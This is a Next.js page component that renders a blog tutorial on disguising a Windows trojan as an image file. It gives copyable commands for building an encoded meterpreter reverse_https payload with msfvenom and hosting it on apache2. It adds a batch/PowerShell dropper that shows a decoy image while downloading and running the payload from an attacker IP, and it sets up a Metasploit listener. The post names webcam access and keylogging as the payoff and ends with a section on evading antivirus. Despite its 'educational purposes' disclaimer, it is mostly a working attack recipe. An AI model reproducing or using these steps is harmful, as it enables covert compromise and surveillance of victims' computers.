import Image from "next/image"
import SyntaxHighlighter from 'react-syntax-highlighter';
import syntaxTheme from "@/components/syntaxTheme";
import CopyButton from "@/components/ui/CopyButton";

const page = () => {
    // const codeString = 
    // `const num = 1;\n let num2 = 3;//`;

    



    const codeString = 
    `msfconsole --payload windows/meterpreter/reverse_https`;

    return (
        <div className='md:w-1/2 max-w-[1300px] mx-auto leading-7 tracking-wide'>

   
            <div className='w-full   mt-10 p-2 md:p-0'>
                {/* <Image
                    src = "https://images.pexels.com/photos/819806/pexels-photo-819806.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1"
                    width={1024}
                    height={1024}
                    alt = "cover image of the blog"
                    className="w-full mt-5 mx-auto"                
                /> */}
                <h1 className="text-4xl font-semibold my-10 mb-2">How to Make a Trojan Virus Look Like an Image File
                </h1>
                <p className="text-muted-foreground">Published on Aug 12, 2024</p>
                <div className="mt-10 w-full">
                    <h2 className="font-medium text-2xl mt-8 ">OverView</h2>


                    <p className="text-muted-foreground my-2">Can you tell the difference between these two files in the image below. One of them is an innocent image while the other one is a trojan that is waiting for you to click on it. Cybercriminals often try to hide their virus inside an innocent looking file. However, when you click on that file, hackers get full access to your computer. In this blog post, we will cover the basics of making a file like that, and use it to hack a computer. Note that this is only for educational purposes, and only test this with computers you have permission to hack. </p>
                    <Image 
                        src = "/freakybob.png"
                        width={500}
                        height={500}
                        alt="image of final result file"
                        className="w-full my-2"
                    /> 


                    <p className="text-muted-foreground">Cybercriminals often disguise malware as harmless files, like images, to trick users into executing malicious code. This blog demonstrates how msfvenom in Kali Linux can create such payloads, combined with a BAT to EXE file converter for disguise. The goal is to raise awareness and help you recognize and defend against these threats. This guide is strictly for educational purposes to promote cybersecurity awareness.</p>
                    
                 
                    <h2 className="font-medium text-2xl mt-8 mb-2 text-muted-foreground">Steps</h2>
                    <p><a className="underline text-blue-500" href="#step1">1. Creating the trojan using msfvenom</a></p>
                    <p><a className="underline text-blue-500" href="#step2">2. Hosting the virus using apache2</a></p>
                    <p><a className="underline text-blue-500" href="#step3">3. Creating the PowerShell file</a></p>
                    <p><a className="underline text-blue-500" href="#step4">4. Listening for Connections</a></p>
                    <p><a className="underline text-blue-500" href="#step5">5. How to make it pass Anti-Virus</a></p>


                    <div id="step1">
                        <h2 className="font-medium text-2xl mt-10 mb-2">Creating the Trojan</h2>
                        <p className="text-muted-foreground text-muted-foreground">
                            First thing we have to do is to create a trojan file using MSFvenom in Kali Linux, and to create the file, we need an IP address the victim is going to connect to once they click on the file and a port. To get the IP of your computer, you can write ifconfig to get your IP. 
                        </p>

                        {/* <Image
                            src=""
                            alt="ifconfig terminal"
                        /> */}

                        <p className="text-muted-foreground mt-4">
                            For the port, we can use 8080, which is a common port number. We can create the malware using this command
                        </p>

                        <div className="p-2 border  w-full mt-4 ">
                            <SyntaxHighlighter language="powershell" style={syntaxTheme} className="dark:!bg-black dark:!text-white" >
                                {`msfvenom --payload windows/meterpreter/reverse_https LHOST=127.0.0.1 LPORT=8080 --format exe --out virus.exe -i 3`}
                            </SyntaxHighlighter>
                        </div>
                        
                        <CopyButton text="msfvenom --payload windows/meterpreter/reverse_https LHOST=127.0.0.1 LPORT=8080 --format exe --out virus.exe -i 3"/>

                        <p className="text-muted-foreground mt-10">
                            In short, msfvenom calls the library, --payload specifies the payload we are going to use in our virus, LHOST is the IP address we got earlier and LPORT is 8080. The output format of the file is .exe and I named it virus.exe, -i specifies how many times you want to encode the payload to make anti-virus harder to tag this file as a virus.
                        </p>

                    </div>


                    <div id="step2">
                        <h2 className="font-medium text-2xl mt-10 mb-2">Hosting the Virus</h2>
                        <p className="text-muted-foreground">
                            In this step, we are going to use **apache2** library in Kali Linux and host the virus. In a real-world example, you would instead host the virus in a web server, but for our purposes, we are going to host it using the apache2 library.  I am going to use the command below to start the server.
                        </p>

                        <div className="p-2 border  w-full mt-4">
                            <SyntaxHighlighter language="powershell" style={syntaxTheme} className="dark:!bg-black dark:!text-white">
                                {`service apache2 start`}
                            </SyntaxHighlighter>
                        </div>
                        <CopyButton text="service apache2 start"/>

                        <p className="text-muted-foreground">
                         Now we have to place the file we created in the previous step inside the web server. In Kali Linux the files hosted by apache2 are located inside /var/www/html, in this folder I am going to create a folder named "files" and put the file inside this folder. Now if we try to access the file using our IP, we can see the file and download it.
                        </p>

                        {/*
                            Place a gif here 
                        */}
                    </div>


                    <div id="step3">
                        <h2 className="font-medium text-2xl mt-10 mb-2">Adding Icon and PowerShell</h2>
                        <p className="text-muted-foreground ">
                            Now we are going to use PowerShell code to create a file that will download an image and the virus we hosted online, and only show the image. In my Windows computer, I am going to use an app called "Bat to Exe converter" and convert the following PowerShell code into .Exe file and make it look like an image.
                        </p>

                        <div className="p-2 border  w-full mt-4">
                            <SyntaxHighlighter language="powershell" style={syntaxTheme} className="dark:!bg-black dark:!text-white">
                                {`cd %TEMP%\nPowershell -Command "Invoke-WebRequest 'https://image.hurimg.com/i/hurriyet/75/750x422/56ac79e067b0a93b28016bc1.jpg' -OutFile image.png"\nimage.png\nPowershell -Command "Invoke-WebRequest 'http://192.168.220.128/files/' -OutFile file.exe"\nfile.exe`}
                            </SyntaxHighlighter>
                        </div>
                        <CopyButton text={`cd %TEMP%\nPowershell -Command "Invoke-WebRequest 'https://image.hurimg.com/i/hurriyet/75/750x422/56ac79e067b0a93b28016bc1.jpg' -OutFile image.png"\nimage.png\nPowershell -Command "Invoke-WebRequest 'http://192.168.220.128/files/' -OutFile file.exe"\nfile.exe`}/>

                        {/* Image of the settings part */}

                        
                        <p className="text-muted-foreground">
                            I am going to use an image of SpongeBob as my Icon file, and will create the file with the settings in the above image.
                        </p>

                        {/* Another image showing the final result */}
                    </div>




                    <div id="step4">
                        <h2 className="font-medium text-2xl mt-10 mb-2">Listening for Connections</h2>
                        <p className="text-muted-foreground">
                            Now that our file is ready, we can listen for connections. When the user clicks on the file, they will connect to our IP address and port, and we can access their webcam, sysinfo, and start a key logger. 
                            To listen for the connections we use the msfconsole to get inside the console, and set the LHOST, LPORT and type of virus we created earlier. 
                        </p>

                        <div className="p-2 border  w-full mt-4">
                            <SyntaxHighlighter language="powershell" style={syntaxTheme} className="dark:!bg-black dark:!text-white">
                                {`msfconsole\nuse exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_https\nset LHOST {your_ip}\nset LPORT 8080`}
                            </SyntaxHighlighter>
                        </div>
                        <CopyButton text={`msfconsole\nuse exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_https\nset LHOST {your_ip}\nset LPORT 8080`}/>


                        <p className="text-muted-foreground">
                            Now our Kali is ready to listen for connections, and when I click on the file on a windows computer, I can see the windows computer connecting to me.
                        </p>

                        {/*GIf */}
                    </div>


                    <div id="step5" className="pb-20">
                        <h2 className="font-medium text-2xl mt-10 mb-2">How to make it pass AntiVirus</h2>
                        <p className="text-muted-foreground">We used msfvenom to create the virus, and since it is a popular tool to create viruses, Anti Virus applications know that the file we created is a virus. However, there is a way to get around the Anti Virus, but it requires creativity. I found these great articles on how to make them pass anti-virus.
                        </p>
                    </div>




                </div>
            </div>  
        </div>
    )
}

export default page